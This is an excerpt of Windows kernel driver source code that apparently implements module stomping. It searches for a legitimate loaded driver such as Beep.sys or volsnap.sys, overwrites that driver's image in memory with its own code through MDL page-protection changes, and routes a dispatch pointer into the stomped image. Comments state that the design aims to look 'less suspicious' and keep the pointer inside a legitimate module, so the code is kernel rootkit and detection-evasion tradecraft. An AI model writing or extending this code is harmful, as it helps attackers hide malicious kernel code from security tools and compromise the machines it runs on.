...
static BOOLEAN WritePhysPage(PVOID dstVa, PVOID srcVa, SIZE_T size) {
    ...
    if (mapped) {
        // Try PAGE_READWRITE first (sufficient for data sections, less suspicious)
        st = MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
        if (!NT_SUCCESS(st))
            st = MmProtectMdlSystemAddress(mdl, PAGE_EXECUTE_READWRITE);
        if (NT_SUCCESS(st))
...
// ============================================================================
// Unified host + stomp target selection
// Single driver serves both roles: dispatch pointer stays within owning module
// ============================================================================

struct UNIFIED_CANDIDATE {
    const WCHAR* DriverName;   // e.g. L"\\Driver\\Beep"
    const WCHAR* ModuleName;   // e.g. L"Beep.sys"
    ULONG        MinSize;      // minimum SizeOfImage for stomp
};

static const UNIFIED_CANDIDATE kUnifiedCandidates[] = {
    { L"\\Driver\\Beep",      L"Beep.sys",      0x8000  },
    { L"\\Driver\\pcw",       L"pcw.sys",       0x10000 },
    { L"\\Driver\\mup",       L"mup.sys",       0x20000 },
    { L"\\Driver\\rdyboost",  L"rdyboost.sys",  0x30000 },
    { L"\\Driver\\volsnap",   L"volsnap.sys",   0x30000 },
};
...
static BOOLEAN FindUnifiedTarget(PVOID ntBase, ULONG requiredSize, UNIFIED_RESULT* out) {
    for (ULONG i = 0; i < ARRAYSIZE(kUnifiedCandidates); i++) {
        const UNIFIED_CANDIDATE* c = &kUnifiedCandidates[i];

        // Check 1: driver object exists and has a device object
        UNICODE_STRING drvName;
        RtlInitUnicodeString(&drvName, c->DriverName);
        PDRIVER_OBJECT drv = nullptr;
        NTSTATUS st = ObReferenceObjectByName(&drvName, OBJ_CASE_INSENSITIVE, nullptr, 0,
        ...
        // Check 2: module is in PsLoadedModuleList and large enough
        PLDR_DATA_TABLE_ENTRY ldr = FindModuleLdrEntry(ntBase, c->ModuleName);
        if (!ldr || !ldr->DllBase || ldr->SizeOfImage < requiredSize) {
            ObDereferenceObject(drv);
            continue;
        }

        // Check 3: valid PE with enough sections
        PIMAGE_NT_HEADERS nt = RtlImageNtHeader(ldr->DllBase);
        if (!nt || nt->FileHeader.NumberOfSections < 2) {
            ObDereferenceObject(drv);
            continue;
        }
...
extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,
    ...
    PDRIVER_OBJECT pDevOwner = nullptr;

    if (selfBase && ntBase) {
        PIMAGE_NT_HEADERS selfNt = RtlImageNtHeader(selfBase);
        ULONG requiredSize = selfNt ? selfNt->OptionalHeader.SizeOfImage : 0;

        // Find a single driver that works as BOTH stomp target and comm host
        UNIFIED_RESULT target = {};
        if (FindUnifiedTarget(ntBase, requiredSize, &target)) {
            pDevOwner = target.driverObj;
            newBase = StompIntoTarget(ntBase, selfBase, target.ldrEntry);
            if (newBase) {
    ...
    // Dispatch points directly into stomped image — same module as host
